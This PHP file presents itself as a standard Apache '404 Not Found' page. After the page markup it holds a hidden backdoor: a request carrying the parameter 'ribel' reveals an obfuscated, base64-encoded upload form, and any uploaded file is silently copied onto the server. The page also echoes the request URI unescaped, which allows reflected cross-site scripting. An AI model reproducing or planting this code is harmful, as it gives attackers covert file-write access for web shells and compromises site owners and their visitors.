<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['REQUEST_URI'];
 ?> was not found on this server.</p>
</body></html>
<?php
if(isset($_GET["ribel"])){
 echo(base64_decode("Ijxmb3"."JtIG1ldGhvZD0n"."UE9TVCcgZW5jdHlw"."ZT0nbXVsdGlwYXJ0L2Z"."vcm0tZGF0YSc+PGl"."ucHV0IHR5cGU9J2ZpbGUnbmF"."tZT0nZicgLz48aW5wdXQgdHlwZT0nc3V"."ibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI="));
 @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
 echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
}
?>
